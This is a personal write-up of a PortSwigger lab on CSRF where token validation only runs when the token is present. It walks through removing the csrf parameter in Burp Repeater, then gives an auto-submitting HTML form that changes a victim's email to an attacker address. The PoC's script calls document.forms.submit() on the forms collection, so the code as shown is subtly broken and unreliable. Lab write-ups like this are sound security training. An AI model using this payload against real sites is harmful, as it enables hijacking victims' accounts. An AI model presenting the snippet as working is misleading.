# PortSwigger Lab: CSRF where token validation depends on token being present

##  How I Solved It

1. **Intercepted & Analyzed:** Captured the `POST /my-account/change-email` request which contained both `email` and `csrf` parameters.
2. **Tested Parameter Removal:** Sent the request to Burp Repeater, completely deleted the `csrf=...` parameter from the request body, and forwarded it. The server accepted the modification with a `200 OK`.
3. **Crafted & Delivered PoC:** Developed a malicious HTML form containing only the `email` field (omitting the `csrf` token) and delivered it to the victim using the exploit server:

```html
<form action="https://0ac900ed042cc305800103c100d90037.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@token-missing.com" />
</form>
<script>
    document.forms.submit();
</script>
```

##  What I Learned
* **Conditional Validation Flaws:** Web applications sometimes validate anti-CSRF tokens *only if* the token parameter exists in the incoming request.
* **Bypass Strategy:** If the back-end logic checks the token condition weakly (e.g., `if (request.hasParameter('csrf')) { validate(); }`), completely removing the `csrf` parameter from the request skips validation entirely, making the endpoint vulnerable.


